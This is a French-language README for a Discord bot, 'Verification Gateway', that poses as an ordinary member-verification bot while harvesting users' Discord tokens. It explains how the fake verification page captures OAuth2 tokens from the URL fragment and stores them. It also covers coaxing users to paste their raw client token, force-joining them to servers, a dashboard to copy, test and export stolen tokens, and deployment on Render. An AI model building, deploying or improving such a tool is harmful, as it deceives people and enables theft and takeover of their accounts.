# Verification Gateway

Un bot Discord qui ressemble exactement a un bot de verification classique
(role `Verifie`, deverrouillage des salons, message + bouton dans un salon dedie),
mais qui en realite **recupere le token Discord de l'utilisateur** dans le meme format
que l'en-tete `Authorization` envoye par le client web (`base64(user_id).base64(timestamp).hmac`).

## Comment la capture fonctionne

1. Le membre rejoint le serveur. Le bot lui donne un role "non verifie" et lui envoie un MP
   contenant un lien de verification.
2. Le membre ouvre `/verify` : une page de verification neutre (analyse de l'appareil,
   barre de progression).
3. Il est redirige vers Discord en OAuth2 (`response_type=token`) avec les scopes
   `identify email guilds guilds.join`. La page de consentement s'affiche normalement.
4. Discord renvoie le token dans le **fragment d'URL**. La page de callback l'extrait,
   nettoie l'URL (`history.replaceState`) et le POST a `/api/capture`.
5. Le backend valide le token sur `/users/@me`, force l'arrivee du membre sur le serveur
   (`guilds.join`), attribue le role via le bot, puis **stocke le token en base**.

Le token OAuth2 partage exactement la meme structure que le token client du screenshot,
et fonctionne avec l'en-tete `Authorization` brut sur `discord.com/api/v9`.

Deux methodes alternatives sont disponibles :

- **Flux `response_type=code`** : le code est echange cote serveur (`/api/exchange`), ce qui
  permet aussi de recuperer un `refresh_token`.
- **Collage manuel** : l'utilisateur colle directement son token client brut depuis
  l'onglet Network de son navigateur.

## Stack

- `bot/` : bot `discord.py` (slash commands, vue persistante, DM a l'arrivee, logs).
- `app/` : dashboard `FastAPI` + templates Jinja2 + Postgres (`asyncpg`).
- `render.yaml` : blueprint Render (1 base gratuite + 1 service web qui heberge aussi le bot).

## Deploiement sur Render

1. Fork ou clone ce depot sur GitHub.
2. Cree une application Discord sur https://discord.com/developers/applications
   - Onglet **Bot** : recupere le token, active **Server Members Intent**.
   - Onglet **OAuth2** : ajoute l'URL de redirection
     `https://<ton-service>.onrender.com/auth/callback`.
3. Sur Render : **New** -> **Blueprint** -> selectionne le depot.
4. Renseigne les variables marquees `sync: false` :
   - `DISCORD_CLIENT_ID`
   - `DISCORD_CLIENT_SECRET`
   - `DISCORD_BOT_TOKEN`
   - `ADMIN_PASSWORD`
   - `PUBLIC_BASE_URL` = `https://<ton-service>.onrender.com`
5. Deploie. Le blueprint provisionne Postgres et le service web.

### Important : plan gratuit Render

Les services web gratuits s'endorment apres 15 minutes sans trafic entrant.
Comme le bot tourne dans le meme process, il se deconnecte aussi.
Pour l'eviter, configure un pinger (UptimeRobot, cron-job.org...) sur
`https://<ton-service>.onrender.com/healthz` toutes les 5 minutes, ou lance
`python scripts/keepalive.py https://<ton-service>.onrender.com`.

## Utilisation du bot

    /setup role:@Verifie channel:#verification [unverified_role:@NonVerifie] [log_channel:#logs]
    /verify member:@membre
    /unverify member:@membre
    /link
    /config
    /captures limit:10
    /status

Le bot doit avoir la permission **Gerer les roles** et son role doit etre
au-dessus du role verifie. Invitation :

    https://discord.com/oauth2/authorize?client_id=<CLIENT_ID>&permissions=268438544&scope=bot%20applications.commands

## Dashboard

- `/dashboard` : connexion avec `ADMIN_PASSWORD` (ou `/dashboard?key=<motdepasse>`).
- Liste des tokens captures : copie, test de validite, suppression, export JSON.
- `/api/captures`, `/api/stats`, `/api/export`, `/api/verifications` (auth cookie).

## Developpement local

    python -m venv .venv && source .venv/bin/activate
    pip install -r requirements.txt
    cp .env.example .env   # puis remplir les valeurs
    uvicorn app.main:app --reload

Le bot demarre automatiquement dans le process si `RUN_BOT=true` et que
`DISCORD_BOT_TOKEN` est present. Pour le lancer separement :

    python -m bot.main

## Structure

    app/
      main.py        routes FastAPI, pages, API de capture
      config.py      configuration par variables d'environnement
      db.py          acces Postgres
      security.py    signature du state OAuth2 et des sessions
      discord_api.py appels HTTP a l'API Discord
      templates/     pages HTML
      static/        CSS + JS
    bot/
      main.py        bot Discord
    scripts/
      keepalive.py   pinger anti-veille pour Render
    render.yaml      blueprint Render
